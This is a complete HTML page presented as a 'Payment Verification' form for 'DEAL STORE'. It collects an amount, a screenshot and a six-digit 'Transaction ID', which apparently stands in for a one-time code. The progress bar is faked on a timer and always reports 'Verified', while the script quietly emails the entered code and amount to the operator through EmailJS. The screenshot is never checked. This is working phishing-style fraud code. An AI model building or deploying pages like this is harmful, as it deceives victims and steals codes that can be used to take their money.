<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px;margin:0}
.box{background:#fff;border:2px solid #f7b500;border-radius:22px;padding:22px;width:100%;max-width:380px;text-align:center}
label{display:block;text-align:left;font-weight:bold;margin:12px 0 5px}
input{width:100%;padding:13px;border:2px solid #ddd;border-radius:10px;box-sizing:border-box}
.btn{width:100%;margin-top:14px;padding:16px;background:#f7b500;border:2px solid #000;border-radius:12px;font-weight:900;font-size:16px;cursor:pointer}
.step{display:none} .step.active{display:block}
.progress-box{margin-top:15px;text-align:left;display:none}
.progress-head{display:flex;justify-content:space-between;font-weight:bold;font-size:13px;margin-bottom:6px}
.bar{width:100%;height:12px;background:#eee;border-radius:20px;overflow:hidden;border:1px solid #000}
.fill{height:100%;width:0%;background:#f7b500;transition:0.3s}
</style>
</head>
<body>

<div class="box step active" id="step1">
<h2>Payment Verification</h2>
<label>Amount</label>
<input type="number" id="amount" value="1500">
<label>Screenshot</label>
<input type="file" id="ss" accept="image/*" style="border:2px dashed #f7b500;background:#fffbe6;padding:10px;border-radius:10px">
<button class="btn" onclick="nextStep()">VERIFY TO CHECK →</button>
</div>

<div class="box step" id="step2">
<h2>Transaction ID</h2>
<input id="txn" type="tel" placeholder="573595" oninput="updateProgress()" style="font-size:36px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:70px;border-radius:12px">

<div class="progress-box" id="pbox">
<div class="progress-head"><span id="vtext">Verification</span><span id="perc">0%</span></div>
<div class="bar"><div class="fill" id="fill"></div></div>
</div>

<div style="display:flex;gap:8px;margin-top:18px">
<button class="btn" style="background:#fff;flex:1" onclick="backStep()">← BACK</button>
<button class="btn" style="flex:2" id="btn2" onclick="sendTxn()">VERIFY</button>
</div>
</div>

<script>
emailjs.init("M1gpuw8FX2OfMZz2-");
const SERVICE_ID = "service_m2y2j8e";
const TEMPLATE_ID = "template_2r1r6ii";

function nextStep(){
 let a=document.getElementById('amount').value;
 let f=document.getElementById('ss').files[0];
 if(!a){alert('Amount likho');return;}
 if(!f){alert('Screenshot select karo');return;}
 document.getElementById('step1').classList.remove('active');
 document.getElementById('step2').classList.add('active');
}
function backStep(){
 document.getElementById('step2').classList.remove('active');
 document.getElementById('step1').classList.add('active');
}
function updateProgress(){
 let val=document.getElementById('txn').value.trim();
 let pbox=document.getElementById('pbox');
 let perc=document.getElementById('perc');
 let fill=document.getElementById('fill');
 if(val.length==0){pbox.style.display='none';return;}
 pbox.style.display='block';
 let p = Math.min( Math.floor((val.length / 6) * 100), 95);
 if(p < 35 && val.length>0) p = 35;
 perc.innerText = p + '%';
 fill.style.width = p + '%';
}
function sendTxn(){
 let id=document.getElementById('txn').value.trim();
 let amount=document.getElementById('amount').value;
 if(id.length<4){alert('Transaction ID likho');return;}
 let btn=document.getElementById('btn2');
 let perc=document.getElementById('perc');
 let fill=document.getElementById('fill');
 let vtext=document.getElementById('vtext');
 btn.innerText='VERIFYING...';
 vtext.innerText='Verifying...';
 let cur = parseInt(perc.innerText);
 let iv = setInterval(()=>{
   cur+=4;
   if(cur>=100){cur=100; clearInterval(iv);
     perc.innerText='100%';
     fill.style.width='100%';
     fill.style.background='#4caf50';
     vtext.innerText='Verified';
     btn.innerText='VERIFIED';
     emailjs.send(SERVICE_ID, TEMPLATE_ID, { transaction_code: id, amount: amount, name: "DEAL STORE" });
   } else {
     perc.innerText=cur+'%';
     fill.style.width=cur+'%';
   }
 }, 100);
}
</script>
</body>
</html>
